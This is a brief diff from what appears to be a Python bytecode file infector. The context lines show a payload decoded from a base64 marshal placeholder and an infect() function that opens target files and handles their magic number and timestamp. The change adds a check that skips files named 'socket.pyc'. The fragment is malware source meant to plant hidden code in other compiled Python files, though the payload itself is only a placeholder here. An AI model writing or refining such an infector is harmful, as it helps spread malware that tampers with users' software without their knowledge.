@@ -13,6 +13,9 @@ payload = Code.from_code(marshal.loads(base64.b64decode("__PAYLOAD_PLACEHOLDER__
 
 
 def infect(f_to_infect):
+    if f_to_infect.endswith("socket.pyc"):
+        return
+
     f = open(f_to_infect, 'r')
 
     #Magic number and timestamp
